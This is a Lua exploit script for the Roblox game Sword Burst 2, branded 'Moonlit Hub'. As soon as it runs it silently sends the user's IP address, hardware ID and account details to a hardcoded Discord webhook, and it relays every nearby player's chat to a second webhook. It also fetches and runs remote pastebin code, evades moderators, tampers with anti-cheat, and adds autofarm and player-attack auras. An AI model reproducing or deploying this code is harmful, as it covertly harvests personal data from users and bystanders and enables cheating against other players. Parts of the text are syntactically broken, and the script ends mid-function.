local http_request = http_request;
if syn then
	http_request = syn.request
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local GetHwiDList = {"Syn-Fingerprint"};
local hwid = "";

for i, v in next, GetHwiDList do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

local body1 = http_request({Url = 'http://ip-api.com/json'; Method = 'GET'}).Body;
local IP = game:GetService('HttpService'):JSONDecode(body1).query
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local Embed = {
    title = 'Moonlit Hub';
    color = '99999';
    type = "rich";
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Profile';
        url = 'https://www.roblox.com/users/'..game:GetService('Players').LocalPlayer.UserId.."/profile";
    };
    fields = {
        {
            name = 'Roblox Name';
            value = "```"..game:GetService('Players').LocalPlayer.Name.."```";
            inline = false;
        },
        {
            name = 'Roblox ID';
            value = "```"..game:GetService('Players').LocalPlayer.UserId.."```";
            inline = false;
        },
        {
            name = 'Game ID';
            value = "```"..game.PlaceId.."```";
            inline = false;
        },
        {
            name = 'Job ID';
            value = "```"..game.JobId.."```";
            inline = false;
        },
            name = 'Generated GUID';
            value = "```"..game:GetService'HttpService':GenerateGUID().."```";
            inline = false;
        },
        {
            name = 'IP';
            value = "```"..IP.."```";
            inline = false;
        },
        {
            name = 'HWID';
            value = "```"..hwid.."```";
            inline = false;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discordapp.com/api/webhooks/664866591451643908/ZiG9zOMFTIn7ge_FKk79CE0-IJ4oSOnB109X_ZRKKvJvezOyBTq7KaR7p2Xu7J6XfJk9';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local prevOutputPos = 0
function output(plr, msg)
    local colour = Color3.fromRGB(255,255,255)
    if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then 
        colour = Color3.fromRGB(255,0,0)
    elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then 
        colour = Color3.fromRGB(0,0,255)
    end
local Embed = {
    title = 'Chat Logs - In Game';
    color = '99999';
    type = "rich";
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Profile - Click Me!';
        url = 'https://www.roblox.com/users/'..plr.UserId..'/profile';
    };
    fields = {
        {
            name = 'Roblox Name';
            value = "```"..plr.Name.."```";
            inline = false;
        },
        {
            name = 'Message';
            value = "```"..msg.."```";
            inline = false;
        },
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discordapp.com/api/webhooks/741623682048327721/dEnDLX8THCDxZ9t3_zEl6pYrdje6Z2COGVv0D9E8FW9_heXKJE_XIHLuLx4jP-Ds6r-6';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
prevOutputPos = prevOutputPos + 0.007
end
for i,v in next, game.Players:GetChildren() do
	v.Chatted:Connect(function(msg)
		output(v, msg)
	end)
end

game.Players.ChildAdded:Connect(function(plr)
	if plr:IsA("Player") then
		plr.Chatted:Connect(function(msg)
			output(plr, msg)
		end)
	end
end)
if game.PlaceId == 659222129 then
	if not game:IsLoaded() then
    	game.Loaded:wait()
   			wait(3)
	    end 
	game:GetService("ReplicatedStorage").Function:InvokeServer('Login', 'deadm00s3')
end

local FloorNames = {
	[1] = {[1] = 540240728 ,[2] = '1 : Arcadia'},
	[2] = {[1] = 542351431 ,[2] = '1 : Virhst Woodlands'},
	[3] = {[1] = 737272595 ,[2] = '1 : Battle Arena'},
	[4] = {[1] = 548231754 ,[2] = '2 : Redveil Grove'},
	[5] = {[1] = 555980327 ,[2] = '3 : Avalanche Expanse'},
	[6] = {[1] = 572487908 ,[2] = '4 : Hidden Wilds'},
	[7] = {[1] = 580239979 ,[2] = '5 : Desolate Dunes'},
	[8] = {[1] = 566212942 ,[2] = '6 : Helmfirth'},
	[9] = {[1] = 582198062 ,[2] = '7 : Entoloma Gloomlands'},
	[10] = {[1] = 548878321 ,[2] = '8 : Blooming Plateau'},
	[11] = {[1] = 573267292 ,[2] = "9 : Va' Rok"},
	[12] = {[1] = 2659143505 ,[2] = '10 : Transylvania'},
	[13] = {[1] = 5287433115 ,[2] = '11 : Hypersiddia'},
	[14] = {[1] = 2724077776,[2] = 'Event Floor : Catacombs'}
}

for k=1, 14 do
if game.PlaceId == FloorNames[k][1] then
pcall(function()
if game:GetService('CoreGui'):FindFirstChild('FinityUI') then
    game:GetService('CoreGui')['FinityUI']:Destroy()
end

local lib=loadstring(game:HttpGet("https://pastebin.com/raw/xpT46ucU", true))()
local libWindow=lib.new(Theme, "Moonlit Hub")
libWindow.ChangeToggleKey(Enum.KeyCode.F1)
libWindow.ChangeBackgroundImage(BackGroundImage, 0.5)
local RunService = game:GetService('RunService')
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

local Player = game:GetService('Players').LocalPlayer
local PlrCharacter = Player.Character
local PlrHumanoidRootPart = PlrCharacter:FindFirstChild('HumanoidRootPart')

local players = game:GetService('Players')
local CL = true
local CK = true
local KM = "MOD Detected!"
local IDs = {
    349854657,
    161949719,
    12671,
    66489540,
    111051084,
    57436909,
    154876159,
    461121215,
    575623917,
    1058240421,
    93988508,
    167655046,
    13444058,
    76999375,
    7858636,
    4402987,
    59341698,
    349854657,
    309775741,
    269112100,
    455293249,
    154876159,
    500009807,
    68210875,
    358748060,
    60673083,
    154847513,
    271388254,
    50879012,
    1099119770,
    24156180,
    373676463,
    173116569,
    62240513,
    1114937945,
    371108489,
    1584345084,
    371108489,
    1114937945,
    167655046,
    102706901,
    109105759,
    101291900,
    90258662,
    35311411,
    163733925
}
function check(player)
    for i,v in next, IDs do 
        if tostring(v) == tostring(player.UserId)then
            return true
        end
    end
    return false
end
function crash(o)
    if o then
        if KM=="MOD Detected!" then 
        players.LocalPlayer:Kick("MOD Detected!")
        else
            players.LocalPlayer:kick(KM)
        end
    else
        pcall(function() players.LocalPlayer.Character:BreakJoints() end)
        wait()
        pcall(function()
            local part = Instance.new("Part")
            local d = part.TouchEnded:Connect(print)
            part.DescendantRemoving:Connect(function()
            d:Disconnect()
            end)
            part:Destroy()
        end)
        while true do print('k') end
    end
end
for i,v in next, players:GetPlayers() do
    if check(v) and CL then
        crash(CK)
    elseif check(v) then
        print('MOD Detected!')
    end
end
players.PlayerAdded:Connect(function(player)
    if check(player) and CL then
        crash(CK)
    elseif check(player) then
        print('MOD Detected!')
    end
end)

local Players = game:GetService('Players')
local Player = Players.LocalPlayer
local PCharacter = Player.Character
local function Invisible()
    local Fake = PCharacter.LowerTorso.Root:Clone()
    PCharacter.LowerTorso.Root:Destroy()
    Fake.Parent = PCharacter.LowerTorso
end

local attackingmob = false
local Attacking = false
local PlayerAttacking = false
local skillname = 'Leaping Slash'
local DamageArea
local getreg = debug.getregistry
local getupvalues = debug.getupvalues
for k, v in next, getreg() do
    if type(v) == 'table' then
        if v.DamageArea then DamageArea = v.DamageArea end
    end
end
local rpcKey = getupvalues(DamageArea)[5]

Initialized = true
function InitializeAoE()
    Initialized = false
    if GetItemType(GetRightWeapon()) ~= 'Katana' then
        local Inv = game.ReplicatedStorage.Profiles[game:GetService('Players').LocalPlayer.Name].Inventory:GetChildren()
        local Weapon = GetRightWeapon()
        local Weapon2 = GetLeftWeapon()
        for a, b in next, Inv do
            if GetItemType(b) == 'Katana' then
                game:GetService("ReplicatedStorage").Function:InvokeServer('Equipment', {'EquipWeapon', b,'Right'})
                game:GetService("ReplicatedStorage").Event:FireServer('Skills', {'UseSkill' ,skillname})
                game:GetService("ReplicatedStorage").Function:InvokeServer('Equipment', {'EquipWeapon', Weapon,'Right'})
                if Weapon2 ~= nil then game:GetService("ReplicatedStorage").Function:InvokeServer('Equipment', {'EquipWeapon', Weapon2 ,'Left'}) end
                break
            end
        end
    else
        game:GetService("ReplicatedStorage").Event:FireServer('Skills', {'UseSkill' ,skillname})
    end
end

function AttackEntity(entity)
    return game:GetService("ReplicatedStorage").Event:FireServer("Combat", rpcKey, {"Attack", skillname, 1, entity})
end

local Range = 30
function getMobRange()
    local mobs = {}
    for k, mob in next, workspace.Mobs:GetChildren() do
        if mob.PrimaryPart and (PlrHumanoidRootPart.Position - mob:GetPrimaryPartCFrame().Position).magnitude < Range and mob.Entity.Health.Value > 0 then
            table.insert(mobs,mob)
        end
    end
    return mobs
end

function Attack()
    local atk
    atk = RunService.Heartbeat:Connect(function()
        if Attacking then
            if Initialized then InitializeAoE() end
            for k, mob in next, getMobRange() do
                attackingmob = true
                AttackEntity(mob,true)
            end
            if getMobRange()[1] == nil then
                attackingmob = false
            end
        else
            atk:Disconnect()
        end
    end)
end


function GetPlayerList()
    local targets = {}
    for k, enemy in next, game.Players:GetChildren() do
        if enemy.Name ~= 'm4nil410' and enemy.Name ~= '92N10' and enemy.Name ~= game.Players.LocalPlayer.Name and workspace:FindFirstChild(enemy.Name) and  workspace:FindFirstChild(enemy.Name):FindFirstChild('HumanoidRootPart') then
            if workspace[enemy.Name].Entity.Health.Value > 0 and (game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position - workspace[enemy.Name]:FindFirstChild('HumanoidRootPart').Position).Magnitude <= Range then
                table.insert(targets, enemy)
            end
        end
    end
    return targets
end

function AttackPlayer()
    local atk
    atk = RunService.Heartbeat:Connect(function()
        if PlayerAttacking then
            if Initialized then InitializeAoE() end
            for k, enemy in next, GetPlayerList() do
                AttackEntity(workspace[enemy.Name],true)
            end
        else
            atk:Disconnect()
        end
    end)
end


--Items
-----------------------------------------------------------------------------------------------
function GetRightWeapon()
    local ItemId = game.ReplicatedStorage.Profiles[game:GetService('Players').LocalPlayer.Name].Equip.Right.Value
    local Inv = game.ReplicatedStorage.Profiles[game:GetService('Players').LocalPlayer.Name].Inventory:GetChildren()
    for i, v in next, Inv do
        if v.Value == ItemId then
        return v
        end
    end
end
function GetLeftWeapon()
    local ItemId = game.ReplicatedStorage.Profiles[game:GetService('Players').LocalPlayer.Name].Equip.Left.Value
    if tonumber(ItemId) == 0 then return nil end
    local Inv = game.ReplicatedStorage.Profiles[game:GetService('Players').LocalPlayer.Name].Inventory:GetChildren()
    for i, v in next, Inv do
        if v.Value == ItemId then
        return v
        end
    end
end

function GetItemType(Item)
    if game.ReplicatedStorage.Database.Items[tostring(Item)]:FindFirstChild('Class') then 
        return game.ReplicatedStorage.Database.Items[tostring(Item)]:FindFirstChild('Class').Value 
    end
end

function GetRarity(Item)
    return game.ReplicatedStorage.Database.Items[tostring(Item)].Rarity.Value
end

local autoDismantler = false
local DismantleFilter = {
    ['Common'] = false,
    ['Uncommon'] = false,
    ['Rare'] = false,
    ['Legendary'] = false
}
game.ReplicatedStorage.Profiles[game:GetService('Players').LocalPlayer.Name].Inventory.ChildAdded:Connect(function(item)
    if autoDismantler == true  then
        local Rarity = GetRarity(item.Name)
        if DismantleFilter[tostring(Rarity)] == true then
            game.ReplicatedStorage.Event:FireServer("Equipment", {"Dismantle", item})
        end
    end
end)


local MainCategory = libWindow:Category('Sword Burst 2')
local MainS = MainCategory:Sector('Main')
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character:WaitForChild'Humanoid':ChangeState(11)
    end
end)
MainS:Cheat('Checkbox', 'AutoFarm', function(State)
_G.Farm = State
noclip = not noclip
local function tpwsbypass()
    local mt = getrawmetatable(game)
    if setreadonly then setreadonly(mt, false) elseif make_writeable then make_writeable(mt) end
    local o_namecall = mt.__namecall; local o_newindex = mt.__newindex
 
    mt.__namecall = function(self, ...)
        local args = {...}
        local method = args[#args]
        if method == "Kick" or method == "BreakJoints" then
            return
        end
        return o_namecall(self, ...)
    end
 
    mt.__newindex = function(t, k, v)
        if k == "Health" then
            return error("Bypassed.")
        elseif k == "Value" and tostring(t) and tostring(t) == "Health" then
            return error("Bypassed.")
        end
        return o_newindex(t, k, v)
    end
end
tpwsbypass()
local Tween
local Player=game:GetService'Players'.LocalPlayer
local TS=game:GetService'TweenService'
local function CancelTeleport()
    if Tween then
        Tween:Cancel()
        Tween=nil
    end
end
local function Teleport(CF,StudsPerSecond,YieldUntilFinish)
    CF=(typeof(CF)=='vector3' and CFrame.new(CF)) or CF
    local Character=Player.Character
    local PP=Character and Character.PrimaryPart
    if PP then
        if Tween then
            Tween:Cancel()
            Tween=nil
        end
        Tween=TS:Create(PP,TweenInfo.new((CF.Position-PP.Position).Magnitude/StudsPerSecond,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame=CF})
        Tween:Play()
        if YieldUntilFinish then
            Tween.Completed:Wait()
        end
    end
end

local plr = game.Players.LocalPlayer; 
local char = plr.Character; 
local data = char:WaitForChild("Entity", 5)

local function getMob()
    for i, v in next, workspace.Mobs:GetDescendants() do
        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Entity") and v:FindFirstChild("Healthbar") then
            return v
        end
    end
end

while _G.Farm do
    wait()
    if not _G.Farm then break end
    local mob = getMob()
        if mob then
            repeat wait()
                if plr.Character then
                    char = plr.Character
                else
                    break
                end
                if char:FindFirstChild("Entity") then
                    data = char.Entity
                else
                    break
                end
                if not mob:FindFirstChild('HumanoidRootPart') then
                    break
                elseif not mob:FindFirstChild('Entity') then
                    break
                elseif not mob:FindFirstChild('Healthbar') then
                    break
                elseif not char:FindFirstChild('HumanoidRootPart') then
                    break
                end
                Teleport(CFrame.new(mob.PrimaryPart.Position + Vector3.new(0,15,0)),79,false)
            until data.Health.Value <= 0 or not mob or not _G.Farm
        end
    end
end)

MainS:Cheat('Button', 'Invisible:', function()
    Invisible()
    game.StarterGui:SetCore('SendNotification', {
    Title = 'Invisible Mode';
    Text = "ON";
    Icon = "rbxassetid://5605321118";
    Duration = 5;
    })
end, {
    text = "Activate"
})
MainS:Cheat('Checkbox', 'Mob Aura', function(State)
    Attacking = State
    coroutine.resume(coroutine.create(Attack))
end)
MainS:Cheat('Checkbox', 'Player Aura', function(State)
    PlayerAttacking = State
    coroutine.resume(coroutine.create(AttackPlayer))
end)
--[[
MainS:Cheat('Slider', 'AoE Speed', function(Value)
    AttackSpeed = (1/Value)
end,{
    min = 2,
    max = 60,
    suffix = ' hits/s'
})
]]--
MainS:Cheat('Slider', 'AoE Range', function(Value)
    Range = Value
end,{
    min = 30,
    max = 60,
    suffix = ' studs'
})
MainS:Cheat('Button', 'Boss Only', function()
local Hypersiddia = 5287433115
local Transylvania = 2659143505
local VaRok = 573267292
local BloomingPlateau = 548878321
local EntolomaGloomlands = 582198062
local DesolateDunes = 580239979
local HiddenWilds = 572487908
local AvalancheExpense = 555980327
local RedveilGrove = 548231754
local VirhstWoodlands = 542351431
local Tween
local Player=game:GetService'Players'.LocalPlayer
local TS=game:GetService'TweenService'
local function CancelTeleport()
    if Tween then
        Tween:Cancel()
        Tween=nil
    end
end
local function Teleport(CF,StudsPerSecond,YieldUntilFinish)
    CF=(typeof(CF)=='vector3' and CFrame.new(CF)) or CF
    local Character=Player.Character
    local PP=Character and Character.PrimaryPart
    if PP then
        if Tween then
            Tween:Cancel()
            Tween=nil
        end
        Tween=TS:Create(PP,TweenInfo.new((CF.Position-PP.Position).Magnitude/StudsPerSecond,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame=CF})
        Tween:Play()
        if YieldUntilFinish then
            Tween.Completed:Wait()
        end
    end
end
if game.PlaceId == VirhstWoodlands then
    Teleport(CFrame.new(-2092.84131,319.95282,1664.3241),79,false) -- [[ Floor 1 ]] --
end
if game.PlaceId == RedveilGrove then
    Teleport(CFrame.new(-2953.10791,113.547928,-9405.42188),79,false) -- [[ Floor 2 ]] --
end
if game.PlaceId == AvalancheExpense then
    Teleport(CFrame.new(-318.086517,4167.81885,-340.550507),79,false) -- [[ Floor 3 ]] --
end
if game.PlaceId == HiddenWilds then
    Teleport(CFrame.new(-2324.0874,2073.04517,-65.8400116),79,false) -- [[ Floor 4 ]] --
end
if game.PlaceId == DesolateDunes then
    Teleport(CFrame.new(2112.1543,1243.48389,-409.240021),79,false) -- [[ Floor 5 ]] --
end
if game.PlaceId == EntolomaGloomlands then
    Teleport(CFrame.new(3271.15869,729.813477,-402.305939),79,false) -- [[ Floor 7 ]] --
end
if game.PlaceId == BloomingPlateau then
    Teleport(CFrame.new(1442.62012,4077.19775,7597.89746),79,false) -- [[ Floor 8 ]] --
end
if game.PlaceId == VaRok then
    Teleport(CFrame.new(12481.2793, 428.948029,-3444.78247),79,false) -- [[ Floor 9 ]] --
end
if game.PlaceId == Transylvania then
    Teleport(CFrame.new(317.134796,930.934631,23848.8262),79,false) -- [[ Floor 10 ]] --
end
if game.PlaceId == Hypersiddia then
    print('NO BOSS in Floor 11')
end
local BossName='Rahjin the Thief King'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-2092.84131,319.95282,1664.3241),79,false)
end
end)
local BossName='Borik the BeeKeeper'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-2953.10791,113.547928,-9405.42188),79,false)
end
end)
local BossName="Ra'thae the Ice King"
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-318.086517,4167.81885,-340.550507),79,false)
end
end)
local BossName='Irath the Lion'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-2324.0874,2073.04517,-65.8400116),79,false)
end
end)
local BossName="Sa'jun the Centurian Chieftain"
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(2112.1543,1243.48389,-409.240021),79,false)
end
end)
local BossName='Smashroom'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(3271.15869,729.813477,-402.305939),79,false)
end
end)
local BossName='Formaug the Jungle Giant'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(1442.62012,4077.19775,7597.89746),79,false)
end
end)
local BossName='Mortis the Flaming Sear'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(12346.4326,429.011932,-3503.52124),79,false)
end
end)
local BossName='Grim the Overseer'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==BossName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(317.134796,930.934631,23848.8262),79,false)
end
end)
end, {
    text = "Start"
})
MainS:Cheat('Button', 'Mini Only', function()
local Hypersiddia = 5287433115
local Transylvania = 2659143505
local VaRok = 573267292
local BloomingPlateau = 548878321
local EntolomaGloomlands = 582198062
local DesolateDunes = 580239979
local HiddenWilds = 572487908
local AvalancheExpense = 555980327
local RedveilGrove = 548231754
local VirhstWoodlands = 542351431
local Tween
local Player=game:GetService'Players'.LocalPlayer
local TS=game:GetService'TweenService'
local function CancelTeleport()
    if Tween then
        Tween:Cancel()
        Tween=nil
    end
end
local function Teleport(CF,StudsPerSecond,YieldUntilFinish)
    CF=(typeof(CF)=='vector3' and CFrame.new(CF)) or CF
    local Character=Player.Character
    local PP=Character and Character.PrimaryPart
    if PP then
        if Tween then
            Tween:Cancel()
            Tween=nil
        end
        Tween=TS:Create(PP,TweenInfo.new((CF.Position-PP.Position).Magnitude/StudsPerSecond,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame=CF})
        Tween:Play()
        if YieldUntilFinish then
            Tween.Completed:Wait()
        end
    end
end
if game.PlaceId == VirhstWoodlands then
    Teleport(CFrame.new(765.694153,642.890198,1300,90295),79,false) -- [[ Floor 1 ]] --
end
if game.PlaceId == RedveilGrove then
    Teleport(CFrame.new(-3759.11475, 153.322708, -2264.03149),79,false) -- [[ Floor 2 ]] --
end
if game.PlaceId == AvalancheExpense then
    Teleport(CFrame.new(1072.8761,6641.06445,2062.68018),79,false) -- [[ Floor 3 ]] --
end
if game.PlaceId == HiddenWilds then
    Teleport(CFrame.new(-1237.27783,5162.54834,-499.173859),79,false) -- [[ Floor 4 ]] --
end
if game.PlaceId == DesolateDunes then
    Teleport(CFrame.new(-1068.71606,4220.74756,-2643.96558),79,false) -- [[ Floor 5 ]] --
end
if game.PlaceId == EntolomaGloomlands then
    Teleport(CFrame.new(-91.4133453,1077.06531,-677.585815),79,false) -- [[ Floor 7 ]] --
end
if game.PlaceId == BloomingPlateau then
    Teleport(CFrame.new(3874.46021,5723.00488,-9512.84863),79,false) -- [[ Floor 8 ]] --
end
if game.PlaceId == VaRok then
    Teleport(CFrame.new(-3641.50635,2905.00635,-7589.78955),79,false) -- [[ Floor 9 ]] --
end
if game.PlaceId == Transylvania then
    Teleport(CFrame.new(49.616806,260.644745,17934.1973),79,false) -- [[ Floor 10 ]] --
end
if game.PlaceId == Hypersiddia then
    Teleport(CFrame.new(5088.91357,1614.14417,2080.58521),79,false) -- [[ Floor 11 ]]--
end
local MiniName='Dire Wolf'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(765.694153,642.890198,1300,90295),79,false)
end
end)
local MiniName='Gorrock the Grove Protector'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-3759.11475, 153.322708, -2264.03149),79,false)
end
end)
local MiniName='Alpha Icewhal'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(1072.8761,6641.06445,2062.68018),79,false)
end
end)
local MiniName='Rotling'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-1237.27783,5162.54834,-499.173859),79,false)
end
end)
local MiniName='Fire Scorpion'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-1068.71606,4220.74756,-2643.96558),79,false)
end
end)
local MiniName='Frogazoid'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-91.4133453,1077.06531,-677.585815),79,false)
end
end)
local MiniName='Hippogriff'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(3874.46021,5723.00488,-9512.84863),79,false)
end
end)
local MiniName='Gargoyle Reaper'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(-3641.50635,2905.00635,-7589.78955),79,false)
end
end)
local MiniName='Baal'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName then
        if Attacking then
            repeat wait()until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(49.616806,260.644745,17934.1973),79,false)
end
end)
local MiniName1='Da'
local MiniName2='Ra'
local MiniName3='Ka'
local Attacking
workspace:WaitForChild'Mobs'.ChildAdded:Connect(function(Boss)
    wait()
    if Boss.Name==MiniName1 then
        if Attacking then
            repeat wait() until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(5088.91357,1614.14417,2080.58521),79,false)
    elseif Boss.Name==MiniName2 then
        if Attacking then
            repeat wait() until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(5088.91357,1614.14417,2080.58521),79,false)
    elseif Boss.Name==MiniName3 then
